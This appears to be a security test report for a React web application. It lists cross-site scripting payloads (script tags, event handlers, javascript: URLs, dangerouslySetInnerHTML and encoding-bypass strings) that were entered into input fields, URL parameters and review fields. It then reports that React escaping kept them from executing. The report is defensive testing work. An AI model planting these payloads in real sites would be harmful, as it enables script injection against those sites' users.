# Tested XSS Payloads

### Basic XSS Payloads

Entered into all user input fields.

```html
<script>alert('XSS1')</script>
<img src="x" onerror="alert('XSS1')">
<body onload="alert('XSS1')">
<svg onload="alert('XSS1')">
<iframe src="javascript:alert('XSS1')">
<a href="javascript:alert('XSS1')">Click me</a>
```
    
### React-Specific XSS Payloads

Entered into all React components.

```jsx
{/* React comment with JS */}
{`${alert('XSS1')}`}
{eval('alert("XSS1")')}
<div dangerouslySetInnerHTML={{__html: "<script>alert('XSS1')</script>"}} />
```

### Event Handler Payloads

```jsx
"><div onClick="alert('XSS1')">Click me</div>
"><input value="XSS1" onFocus="alert('XSS1')" autofocus>
"><button onmouseover="alert('XSS1')">Hover me</button>
```

### URL Parameter Payloads

Entered into all URL parameters.

```html
?search=<script>alert('XSS1')</script>
?q=<img src=x onerror=alert('XSS1')>
?redirect=javascript:alert('XSS1')
```

### Stored XSS Payloads

Entered into all review fields.

```html
Nice book! <script>alert('XSS1')</script>
I enjoyed reading this. <img src="x" onerror="alert('XSS1')">
Great story! <svg onload="alert('XSS1')"></svg>
```

### Encoding Bypass Payloads

```html
%3Cscript%3Ealert('XSS1')%3C/script%3E
<scr<script>ipt>alert('XSS1')</script>
&#x3C;script&#x3E;alert(&#x27;XSS1&#x27;)&#x3C;/script&#x3E;
```

## Findings:
- All payloads above were stored in the database when entered as a username, but not password on signup.
- All payloads above were stored in the database when entered as a review.
- Payloads did not execute when accessed from database.
- Escaping of special characters was implemented by React.

## Recommendations:
- User inputs should be sanitized and validated before being stored in the database.
- User inputs should be sanitized and validated before being rendered to the DOM.